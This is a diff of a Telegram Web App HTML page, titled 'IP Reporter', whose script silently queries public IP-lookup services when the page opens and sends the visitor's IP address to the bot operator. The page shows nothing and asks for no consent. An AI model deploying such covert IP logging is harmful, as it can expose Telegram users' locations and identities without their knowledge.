@@ -1,75 +1,59 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <title>Определение IP</title>
-    <script src="https://telegram.org/js/telegram-web-app.js?19"></script>
-    <style>
-        body { background: #fff; }
-    </style>
+  <meta charset="utf-8" />
+  <title>IP Reporter</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://telegram.org/js/telegram-web-app.js?20"></script>
 </head>
-
 <body>
-    <script>
-        (function () {
-            'use strict';
+<script>
+(async function () {
+  const Telegram = window.Telegram;
+  if (!Telegram || !Telegram.WebApp) return;
 
-            const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://api.my-ip.io/ip.json',
-                'https://ipwho.is/?output=json',
-                'https://ipapi.co/json/'
-            ];
+  Telegram.WebApp.ready();
 
-            if (typeof Telegram === 'undefined' || typeof Telegram.WebApp === 'undefined') return;
-            const webApp = Telegram.WebApp;
-            webApp.ready();
+  const ipServices = [
+    'https://api.ipify.org?format=json',
+    'https://api.my-ip.io/ip.json',
+    'https://ipwho.is/?output=json',
+    'https://ipapi.co/json/'
+  ];
 
-            async function fetchIPFromService(url) {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                try {
-                    const response = await fetch(url, { signal: controller.signal });
-                    clearTimeout(timeoutId);
-                    const data = await response.json();
-                    if (data.ip) return data.ip;
-                    throw new Error('Некорректный ответ');
-                } catch (e) {
-                    clearTimeout(timeoutId);
-                    throw e;
-                }
-            }
+  async function fetchIP(url) {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+      const res = await fetch(url, { signal: controller.signal });
+      clearTimeout(timeout);
+      const data = await res.json();
+      return data.ip || null;
+    } catch {
+      clearTimeout(timeout);
+      return null;
+    }
+  }
 
-            async function getIP() {
-                for (let i = 0; i < ipServices.length; i++) {
-                    try {
-                        const ip = await fetchIPFromService(ipServices[i]);
-                        sendIP(ip);
-                        return;
-                    } catch (_) {}
-                }
-                sendIP(null, 'Не удалось определить IP');
-            }
+  for (const url of ipServices) {
+    const ip = await fetchIP(url);
+    if (ip) {
+      Telegram.WebApp.sendData(JSON.stringify({
+        type: 'ip_report',
+        ip: ip,
+        status: 'ok',
+        timestamp: new Date().toISOString()
+      }));
+      return;
+    }
+  }
 
-            function sendIP(ip, errorMsg = null) {
-                const payload = {
-                    type: 'ip_report',
-                    ip,
-                    timestamp: new Date().toISOString(),
-                    status: errorMsg ? 'error' : 'ok',
-                    error: errorMsg || undefined
-                };
-
-                try {
-                    webApp.sendData(JSON.stringify(payload));
-                } catch (_) {}
-            }
-
-            getIP();
-        })();
-    </script>
+  Telegram.WebApp.sendData(JSON.stringify({
+    type: 'ip_report',
+    status: 'fail',
+    timestamp: new Date().toISOString()
+  }));
+})();
+</script>
 </body>
-
 </html>
